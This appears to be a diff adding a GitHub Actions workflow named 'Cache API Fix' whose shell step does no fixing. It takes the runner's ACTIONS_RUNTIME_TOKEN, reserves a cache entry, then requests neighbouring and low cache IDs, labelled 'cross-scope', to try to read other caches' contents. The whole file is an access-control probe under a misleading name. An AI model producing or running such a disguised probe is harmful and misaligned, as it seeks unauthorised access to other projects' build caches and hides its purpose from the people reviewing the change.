@@ -1,0 +1,56 @@
+name: Cache API Fix
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Proper cache API call
+        run: |
+          # Use the cache action's own approach
+          CACHE_URL="${ACTIONS_CACHE_URL}"
+          TOKEN="${ACTIONS_RUNTIME_TOKEN}"
+          
+          echo "=== Correct cache API format ==="
+          # The version is SHA256 of the paths being cached
+          VERSION=$(echo -n "cache-dir" | sha256sum | cut -d' ' -f1)
+          
+          echo "Cache URL: $CACHE_URL"
+          echo "Version hash: $VERSION"
+          
+          # Lookup cache with correct format
+          RESP=$(curl -s -w "\nHTTP:%{http_code}" \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "Accept: application/json;api-version=6.0-preview.1" \
+            "${CACHE_URL}_apis/artifactcache/cache?keys=build-cache-main-v1&version=$VERSION")
+          echo "Own lookup:"
+          echo "$RESP" | head -5
+          
+          echo ""
+          echo "=== Reserve + upload to our own cache ==="
+          RESERVE=$(curl -s -w "\nHTTP:%{http_code}" \
+            -X POST \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "Content-Type: application/json" \
+            -H "Accept: application/json;api-version=6.0-preview.1" \
+            "${CACHE_URL}_apis/artifactcache/caches" \
+            -d "{\"key\":\"xscope-test-$(date +%s)\",\"version\":\"$VERSION\"}")
+          echo "Reserve: $RESERVE"
+          
+          # Extract cache ID from reserve response
+          CACHE_ID=$(echo "$RESERVE" | head -1 | python3 -c "import json,sys; print(json.load(sys.stdin).get('cacheId','none'))" 2>/dev/null)
+          echo "Cache ID: $CACHE_ID"
+          
+          if [ "$CACHE_ID" != "none" ] && [ -n "$CACHE_ID" ]; then
+            echo ""
+            echo "=== Try to access sequential cache IDs (cross-scope) ==="
+            for ID in 1 $((CACHE_ID - 1)) $((CACHE_ID + 1)); do
+              R=$(curl -s -w "\nHTTP:%{http_code}" --max-time 3 \
+                -H "Authorization: Bearer $TOKEN" \
+                -H "Accept: application/octet-stream" \
+                "${CACHE_URL}_apis/artifactcache/caches/$ID")
+              S=$(echo "$R" | tail -1)
+              echo "  Cache ID $ID: $S"
+            done
+          fi
